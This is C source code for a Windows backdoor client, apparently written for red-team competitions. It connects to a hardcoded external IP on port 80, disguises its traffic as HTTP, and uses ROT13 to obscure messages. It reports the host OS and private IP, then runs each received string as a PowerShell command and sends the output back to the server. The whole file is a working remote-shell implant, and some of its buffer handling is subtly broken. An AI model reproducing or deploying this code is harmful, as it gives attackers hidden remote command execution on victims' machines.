#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <process.h>
#include <ws2tcpip.h>
#pragma comment(lib,"ws2_32.lib")
#define _CRT_SECURE_NO_WARNINGS

static void encrypt(char* plainText) {
    // This function takes a pointer to a string, and rotates the characters by 13
    // Because the Ceaser Cipher we are using is 13 characters, the same cipher can be applied
    // To do both encryption and decryption

    // Build the encrypted String by iterating through each character, and rotating it.
    char* newString = (char*)calloc(1024, sizeof(char));
    for (int i = 0; i < strnlen(plainText, 1024); i++) {
        if ((plainText[i] >= 'a' && plainText[i] <= 'z')) {
            newString[i] = ((plainText[i] - 'a' + 13) % 26) + 'a';
        }
        else if ((plainText[i] >= 'A' && plainText[i] <= 'Z')) {
            newString[i] = ((plainText[i] - 'A' + 13) % 26) + 'A';
        }
        else {
            newString[i] = plainText[i];
        }
    }

    // Replace the the plain text with the cipher text
    strcpy_s(plainText, 1024, newString);

    // Free teh memory allocated to newString
    free(newString);
}

void sendKeepAlive(SOCKET clientSocket) {
    // Every 30 seconds, send a KEEP_ALIVE message to the server, to keep the socket open
    while (1) {
        char keepAlive[] = "KEEP_ALIVE";
        encrypt(keepAlive);
        Sleep(30000);
        send(clientSocket, keepAlive, strnlen(keepAlive, 11), 0);
    }
}

int main(void) {
    // Initialize the Socket, and server address variables
    WSADATA sockData;
    SOCKET clientSocket;
    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));

    WSAStartup(MAKEWORD(2, 2), &sockData);

    char serverMessage[1024];
    for (int i = 0; i < 1024; i++) serverMessage[i] = '\0';

    // Create socket
    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == -1) {
        perror("Error creating socket");
        exit(-1);
    }

    // Set up server address and port
    const char* serverIPAddress = "167.172.13.38";
    wchar_t wideServerIPAddress[16];
    size_t convertedChars = 0;
    mbstowcs_s(&convertedChars, wideServerIPAddress, sizeof(wideServerIPAddress) / sizeof(wchar_t), serverIPAddress, _TRUNCATE);
    serverAddr.sin_family = AF_INET;
    InetPton(AF_INET, wideServerIPAddress, &serverAddr.sin_addr.s_addr);
    serverAddr.sin_port = htons(80);

    // Connect to server
    int result = connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
    if (result != 0) {
        int error = WSAGetLastError();
        printf("Error Code: %d\n", error);
        exit(error);
    }

    int threadnum = 0;
    SOCKET thread;
    
    // The first message sent to the Server is the OS
    const char* osMessage = "Windows\n";
    send(clientSocket, osMessage, strnlen(osMessage, 8), 0);

    // The second message sent to the Server is the host address.
    // The host address is needed, as in a traditional red vs blue competition, most of the 
    // Infrastructure is sitting behind NAT, while the Proxy server is publicly acessible.
    // So instead of specifying clients by their Natted IP Address, we'd rather look at thier
    // Private IP address that is unique for that competition
    char host[256];
    char ipstr[INET_ADDRSTRLEN + 2];
    struct addrinfo hints, * res, * p;
    int status;

    // Get the hostname
    gethostname(host, sizeof(host));

    // Set up the hints structure
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    // Get address information
    status = getaddrinfo(host, NULL, &hints, &res);

    // Loop through all the results and get the first IPv4 address
    for (p = res; p != NULL; p = p->ai_next) {
        void* addr = NULL;
        if (p->ai_family == AF_INET) {
            struct sockaddr_in* ipv4 = (struct sockaddr_in*)p->ai_addr;
            addr = &(ipv4->sin_addr);

            // Convert the IP to a string
            inet_ntop(p->ai_family, addr, ipstr, sizeof ipstr);
            ipstr[strnlen(ipstr, 17) + 1] = '\n';
            send(clientSocket, ipstr, strnlen(ipstr, 16), 0);

            // Break after the first IP address is found
            break;
        }
    }

    // Free the linked list
    freeaddrinfo(res);

    // Start a thread to send a keep alive message every 30 seconds to the Server
    thread = _beginthreadex(NULL, 0, (_beginthreadex_proc_type)&sendKeepAlive, &clientSocket, 0, NULL);

    while (1) {
        // Get message from Server
        int bytesRead = recv(clientSocket, serverMessage, 1023, 0);
        int junk = getchar(); // clearout \n
        serverMessage[bytesRead] = '\0';

        printf("Server sent: %s\n", serverMessage);

        // Because the Connecttion is disguised in HTTP, there are a handful of headers we don't care about.
        const char* httpOK = "HTTP/1.1 200 OK";
        const char* contentLength = "Content-Length:";
        const char* contentType = "Content-Type: text/plain; charset=utf-8";
        if ((strncmp(serverMessage, httpOK, 17) != 0) && (strstr(serverMessage, contentLength) == NULL) && (strncmp(serverMessage, contentType, 41) != 0) && (serverMessage[0] != '\0')) {
            encrypt(serverMessage);
            const char* keepAlive = "KEEP_ALIVE";
            // Check to make sure the message isn't a keep alive message
            if (strncmp(serverMessage, keepAlive, 11) != 0) {
                // Create the string to run the command in the format "Powershell.exe -Command /"[cmdlet]/"
                char command[1100] = "Powershell.exe -Command \"";
                strcat_s(command, rsize_t(1100), serverMessage);
                strcat_s(command, rsize_t(1100), "\"");
                
                // Create variables to run and store command output
                char commandOutput[8192];
                FILE* pipe;

                // Open the command for reading
                pipe = _popen(command, "r");
                if (pipe == NULL) {
                    printf("Error opening pipe.\n");
                    return 1;
                }

                // Read the output a line and send it back to the Server
                while (fgets(commandOutput, 8190, pipe) != NULL) {
                    // fgets appends \0 to the end, but not \n. The next 3 lines overwrite the \0 with \n, and then append \0 after
                    int len = strnlen(commandOutput, 8190) + 1;
                    commandOutput[len + 1] = '\n';
                    commandOutput[len + 2] = '\0';
                    printf("%s", commandOutput);
                    send(clientSocket, commandOutput, strnlen(commandOutput, 8192), 0);
                }

                // Close the pipe
                _pclose(pipe);
            }
        }
    }

    // Close client socket
    closesocket(clientSocket);

    return 0;
}
